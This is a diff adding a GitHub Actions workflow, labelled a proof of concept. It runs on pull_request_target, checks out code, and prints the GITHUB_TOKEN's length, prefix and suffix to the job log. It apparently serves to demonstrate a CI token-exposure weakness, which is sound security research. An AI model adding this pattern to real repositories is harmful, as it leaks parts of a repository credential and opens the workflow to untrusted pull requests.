@@ -1,0 +1,20 @@
+name: PoC - Obfuscated GitHub Token
+
+on:
+  pull_request_target:
+
+jobs:
+  token-exposure:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR code
+        uses: actions/checkout@v3
+
+      - name: Prove GITHUB_TOKEN Access (Obfuscated)
+        run: |
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+
+          echo "=== Proof of Concept ==="
+          echo "Token length: ${#TOKEN}"
+          echo "Token prefix: ${TOKEN:0:4}****"
+          echo "Token suffix: ****${TOKEN: -4}"
